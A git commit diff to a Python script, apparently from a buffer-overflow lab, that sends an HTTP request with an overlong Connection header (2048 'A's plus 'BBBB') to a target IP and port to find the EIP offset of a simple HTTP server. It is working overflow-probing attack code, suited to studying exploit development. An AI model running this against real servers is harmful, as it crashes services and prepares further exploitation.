ace09f0e10ee53cd82787e68019d2747b241dc3a
danilofernassis <danilofernassis@gmail.com>
2021-05-11 15:04:54 -0300

    First Commint

--- Buffer_Overflow/Simple_HTTP_Server/eip_offset.py
+++ Buffer_Overflow/Simple_HTTP_Server/eip_offset.py
@@ -3,7 +3,6 @@
 import socket
 import sys
 
-# script stop with 2100
 # how to execute:
 # python overflow.py 192.168.1.109 80
 
@@ -11,21 +10,25 @@ import sys
 ip = sys.argv[1]
 port = int(sys.argv[2])
 
-junk = ("A" * 1000)
+
+junk = ("A" * 2048)
+
+eip = "BBBB"
+
+exploit = junk + eip
 
 while True:
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((ip, port))
-        print("Fuzzing " + str(len(junk)))
+        print("Fuzzing " + str(len(exploit)))
         buff = ("GET / HTTP/1.1\r\n")
         s.send(buff)
         buff = ("Host: " + ip + "\r\n")
         s.send(buff)
-        buff = ("Connection: " + junk + "\r\n\n")
+        buff = ("Connection: " + exploit + "\r\n\n")
         s.send(buff)
         s.recv(1024)
         s.close()
-        junk += ("A" * 100)
     except:
         sys.exit(0)
